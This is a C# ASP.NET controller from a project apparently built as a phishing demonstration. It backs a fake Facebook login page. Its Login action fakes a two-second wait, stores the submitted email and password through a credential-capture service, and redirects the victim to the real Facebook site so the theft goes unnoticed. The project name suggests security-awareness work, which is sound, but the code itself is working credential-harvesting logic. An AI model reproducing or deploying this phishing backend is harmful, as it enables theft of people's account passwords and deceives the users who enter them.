using Microsoft.AspNetCore.Mvc;
using Phishing_Sajber_Bezbednost.DTOs;
using Phishing_Sajber_Bezbednost.Implementation.Interfaces;
using Phishing_Sajber_Bezbednost.Models;

namespace Phishing_Sajber_Bezbednost.Controllers
{
    public class FacebookController : Controller
    {
        private readonly ICredentialsService _credentialsService;
        public FacebookController(ICredentialsService credentialsService)
        {
            _credentialsService = credentialsService;
        }
        public IActionResult Index()
        {
            return View();
        }

        public async Task<IActionResult> Login(FacebookLoginDto credentials)
        {
            await Task.Delay(2000); //Simuliramo čekanje na login

            await _credentialsService.CaptureUserCredentials(credentials.Email, credentials.Password, "Facebook"); // Beležimo kredencijale korisnika

            return Redirect("https://www.facebook.com");
        }
    }
}
